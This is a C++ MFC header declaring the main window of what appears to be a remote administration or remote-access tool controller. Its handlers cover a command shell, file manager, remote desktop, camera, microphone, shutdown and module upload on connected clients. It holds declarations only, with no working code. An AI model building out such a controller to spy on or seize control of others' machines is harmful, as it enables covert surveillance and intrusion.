
// MainFrm.h : CMainFrame 类的接口
//

#pragma once
#include "ClientList.h"

#define VIEW_SHOW_CLIENLIST	1
#define VIEW_SHOE_LOG		2

#define SVR_STATU_STARTING	0			//正在开启
#define SVR_STATU_STARTED	1			//已经开启
#define SVR_STATU_STOPPING	2			//正在关闭
#define SVR_STATU_STOPPED	3			//已经关闭


class CIOCPServer;

class CMainFrame : public CFrameWnd
{
	friend class CManager;
public:
	CMainFrame();

	
protected: 
	DECLARE_DYNAMIC(CMainFrame)

// 特性
public:

// 操作
public:

// 重写
public:
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
// 实现
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

private:  // 控件条嵌入成员
	CStatusBar        m_wndStatusBar;
	//日志
	CFont			  m_LogFont;
	CEdit			  m_Log;
	//客户列表
	CClientList		  m_ClientList;

	DWORD			  m_View;
	DWORD			  m_ServerStatu;
	BOOL			  m_bExitAfterStop;
	//服务器
	CIOCPServer*	  m_pServer;
// 生成的消息映射函数
protected:
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSetFocus(CWnd *pOldWnd);
	DECLARE_MESSAGE_MAP()

	void Log(CString text);
public:
	afx_msg void OnPaint();
	afx_msg void OnViewClientlist();
	afx_msg void OnViewLog();
	afx_msg void OnUpdateViewClientlist(CCmdUI *pCmdUI);
	afx_msg void OnUpdateViewLog(CCmdUI *pCmdUI);
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnMainStartserver();
	afx_msg void OnUpdateMainStartserver(CCmdUI *pCmdUI);

	afx_msg void OnUpdateStatuBar();
	//服务器开启和关闭后会通知该窗口
	afx_msg LRESULT OnSvrStarted(WPARAM wResult, LPARAM lNoUsed);
	afx_msg LRESULT OnSvrStopped(WPARAM wNoUsed, LPARAM lNoUsed);

	//当有socket连接的时候通过该函数来初始化Handler
	afx_msg LRESULT OnSocketConnect(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnSocketClose(WPARAM wParam,LPARAM lParam);

	afx_msg void OnClose();
	afx_msg void OnMainExit();
	//Control:
	afx_msg void OnSessionDisconnect();
	afx_msg void OnSessionUninstall();
	afx_msg void OnPowerShutdown();
	afx_msg void OnPowerReboot();
	afx_msg void OnOperationEditcomment();
	afx_msg void OnUploadmoduleFromdisk();
	afx_msg void OnUploadmoduleFromurl();
	afx_msg void OnUpdateMainExit(CCmdUI *pCmdUI);
	afx_msg void OnOperationCmd();
	afx_msg void OnOperationChatbox();
	afx_msg void OnOperationFilemanager();
	afx_msg void OnOperationRemotedesktop();
	afx_msg void OnOperationCamera();
	afx_msg void OnSessionRestart();
	afx_msg void OnOperationMicrophone();
};


